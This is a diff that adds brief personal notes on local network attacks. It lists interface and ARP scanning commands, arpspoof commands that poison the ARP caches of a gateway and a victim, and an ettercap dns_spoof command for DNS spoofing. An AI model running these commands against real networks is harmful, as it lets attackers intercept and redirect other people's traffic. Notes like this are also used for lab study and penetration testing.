@@ -1,0 +1,17 @@
+show ips:
+	#ifconfig
+
+scan network with ARP scan:
+	#netdiscover    -- active mode
+	#netdiscover -p -- passive mode
+
+ARP spoof:
+	#arpspoof -t <Gateway IP address> <victim IP address>  -- poisoning gateway's arp cache
+	#arpspoof -t <Victim IP address> <Gateway IP address>  -- poisoning victim's arp cache
+
+to view arp cache in your machine:
+	#arp -a
+
+DNS spoof:
+	use arp spoof the commands below
+	#ettercap -Tq -P dns_spoof
